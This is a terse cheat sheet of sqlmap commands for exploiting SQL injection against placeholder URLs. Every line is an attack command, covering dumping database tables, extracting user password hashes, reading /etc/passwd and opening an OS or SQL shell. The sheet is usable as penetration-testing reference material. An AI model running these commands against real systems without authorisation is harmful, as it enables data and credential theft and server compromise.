Basic sqlmap command : sqlmap -u "https://somethingurl.com/somepage.extension?id=1'" --random-agent

To get banner and fingerprinting remote system and its database : sqlmap -u "https://somethingurl.com/something.extension?id=1'" -b

To retrive database : sqlmap -u "https://somethingurl.com/somepage.extension?id=1'" --random-agent --dbs

To retrive tables of database : sqlmap -r something.txt -p somethingkey -a --tables -D somedatabase

To retrive column present in table of database : sqlmap -r something.txt -p somethingkey -a --columns -D somedatabase -T sometablefromsomedatabase

To get data from the database table : sqlmap -r something.txt -p somethingkey -a --dump -D somedatabase -T sometablefromsomedatabase

To fetch the list of users and roles : sqlmap -r something.txt -p somethingkey --users --passwords --privileges --roles --threads=10

To fetch current user : sqlmap -r something.txt -p somethingkey -a --current-user --is-dbs --current-db --hostname --threads=10

To read remote file on the remote system : sqlmap -r something.txt -p somethingkey --file-read=/etc/passwd --threads=10

To run arbitary sql command : sqlmap -r something.txt -p somethingkey --sql-query="select now();"

To get system shell : sqlmap -r something.txt -p somethingkey --batch --os-shell

To get sql shell maybe : sqlmap -r something.txt -p somethingkey --batch --sql-shell

